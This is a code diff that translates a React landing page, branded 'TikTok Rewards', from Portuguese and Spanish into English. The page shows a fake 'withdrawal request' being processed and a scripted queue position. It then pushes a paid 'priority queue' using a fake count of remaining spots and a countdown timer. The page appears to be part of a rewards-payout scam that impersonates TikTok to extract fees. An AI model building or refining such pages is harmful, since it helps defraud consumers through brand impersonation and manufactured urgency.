@@ -6,15 +6,15 @@ import { CheckCircle2, Clock, Zap, ShieldCheck, ArrowRight, AlertCircle } from "
 export const Route = createFileRoute("/obrigado3")({
   head: () => ({
     meta: [
-      { title: "Procesando solicitud | TikTok Rewards" },
+      { title: "Processing Request | TikTok Rewards" },
       {
         name: "description",
-        content: "Estamos procesando su solicitud de retiro.",
+        content: "We are processing your withdrawal request.",
       },
-      { property: "og:title", content: "Procesando solicitud" },
+      { property: "og:title", content: "Processing Request" },
       {
         property: "og:description",
-        content: "Estamos procesando su solicitud de retiro.",
+        content: "We are processing your withdrawal request.",
       },
       { property: "og:type", content: "website" },
       { name: "twitter:card", content: "summary_large_image" },
@@ -32,10 +32,10 @@ function Obrigado3() {
   const [spotsLeft, setSpotsLeft] = useState(7);
   
   const statusMessages = [
-    "Validando pago",
-    "Gerando acesso",
-    "Reservando prioridade",
-    "Finalizando processo"
+    "Validating payment",
+    "Generating access",
+    "Reserving priority",
+    "Finalizing process"
   ];
 
   const queueSteps = [327, 198, 96, 41];
@@ -127,10 +127,10 @@ function Obrigado3() {
              <div className="absolute inset-0 bg-gradient-to-tr from-transparent via-white/[0.02] to-transparent pointer-events-none" />
              
              <h1 className="text-white text-[24px] font-black text-center mb-2 tracking-tight">
-               Estamos processando sua solicitação...
+               We are processing your request...
              </h1>
              <p className="text-neutral-500 text-[14px] text-center mb-10">
-               Aguarde alguns segundos. Estamos reservando sua prioridade.
+               Please wait a few seconds. We are reserving your priority.
              </p>
 
              {/* Progress Bar Container */}
@@ -186,16 +186,16 @@ function Obrigado3() {
 
            <div className="text-center mb-8">
              <h2 className="text-white text-[28px] font-black leading-tight mb-4">
-               Sua solicitação foi recebida.
+               Your request has been received.
              </h2>
              <p className="text-neutral-400 text-[15px] leading-relaxed">
-               Seu pedido foi registrado com sucesso. Neste momento ele está passando pelo processo de liberação. Para manter a ordem de atendimento, existe uma fila de processamento.
+               Your request was successfully registered. Right now it is going through the release process. To keep the order of service, there is a processing queue.
              </p>
            </div>
 
            {/* Queue Display */}
            <div className="bg-white/5 rounded-2xl p-6 border border-white/5 flex flex-col items-center mb-8 relative">
-              <span className="text-[12px] font-bold text-neutral-500 uppercase tracking-widest mb-1">POSIÇÃO NA FILA</span>
+              <span className="text-[12px] font-bold text-neutral-500 uppercase tracking-widest mb-1">QUEUE POSITION</span>
               <div className="text-[48px] font-black text-white tabular-nums tracking-tighter transition-all duration-500 scale-110">
                 #{queuePosition}
               </div>
@@ -209,28 +209,28 @@ function Obrigado3() {
            <div className="border-t border-white/10 pt-8 mt-2">
              <div className="flex items-center justify-center gap-2 mb-4">
                <Zap className="text-[#25f4ee]" size={18} />
-               <h3 className="text-white text-[19px] font-bold">Antecipe sua posição na fila.</h3>
+               <h3 className="text-white text-[19px] font-bold">Move up in the queue.</h3>
              </div>
              
              <p className="text-neutral-400 text-[14px] text-center mb-8">
-               Você pode entrar na fila prioritária e acelerar o processamento da sua solicitação. Esta oportunidade está disponível apenas neste momento.
+               You can join the priority queue and speed up the processing of your request. This opportunity is available only right now.
              </p>
 
              {/* Scarcity Banner */}
              <div className="flex items-center justify-center gap-2 bg-[#ff3b5c]/10 rounded-full py-2 px-4 mb-6 border border-[#ff3b5c]/20">
                 <AlertCircle className="text-[#ff3b5c]" size={14} />
                 <span className="text-[#ff3b5c] text-[12px] font-bold">
-                  APENAS {spotsLeft} VAGAS PRIORITÁRIAS DISPONÍVEIS
+                  ONLY {spotsLeft} PRIORITY SPOTS AVAILABLE
                 </span>
              </div>
 
              {/* Benefits List */}
              <div className="grid grid-cols-1 gap-4 mb-10">
                 {[
-                  { icon: <Clock size={16} />, text: "Atendimento prioritário" },
-                  { icon: <Zap size={16} />, text: "Processamento acelerado" },
-                  { icon: <ShieldCheck size={16} />, text: "Liberação mais rápida" },
-                  { icon: <Zap size={16} />, text: "Prioridade na fila" },
+                  { icon: <Clock size={16} />, text: "Priority service" },
+                  { icon: <Zap size={16} />, text: "Accelerated processing" },
+                  { icon: <ShieldCheck size={16} />, text: "Faster release" },
+                  { icon: <Zap size={16} />, text: "Queue priority" },
                 ].map((item, i) => (
                   <div key={i} className="flex items-center gap-3 bg-white/[0.02] p-3 rounded-xl border border-white/5">
                     <div className="text-[#25f4ee]">{item.icon}</div>
@@ -247,7 +247,7 @@ function Obrigado3() {
 
                 >
                   <span className="relative z-10 flex items-center justify-center gap-2">
-                    🚀 ANTECIPAR MINHA FILA
+                    🚀 MOVE UP IN MY QUEUE
                   </span>
                   {/* Glossy animated shine */}
                   <div className="absolute inset-0 w-full h-full bg-gradient-to-r from-transparent via-white/20 to-transparent -translate-x-full animate-[shimmer_2s_infinite] pointer-events-none" />
@@ -256,7 +256,7 @@ function Obrigado3() {
 
              {/* Timer */}
              <div className="mt-6 flex flex-col items-center">
-                <span className="text-neutral-600 text-[11px] font-bold uppercase tracking-widest mb-1">OFERTA EXPIRA EM</span>
+                <span className="text-neutral-600 text-[11px] font-bold uppercase tracking-widest mb-1">OFFER EXPIRES IN</span>
                 <span className="text-[#25f4ee] font-mono text-[20px] font-bold tracking-wider">{formatTime(timeLeft)}</span>
              </div>
            </div>
@@ -267,7 +267,7 @@ function Obrigado3() {
           className="text-neutral-600 text-[13px] font-medium hover:text-neutral-400 transition-colors flex items-center gap-2"
           onClick={() => {}}
         >
-          Não, prefiro continuar aguardando.
+          No, I'd rather keep waiting.
           <ArrowRight size={14} />
         </button>
 
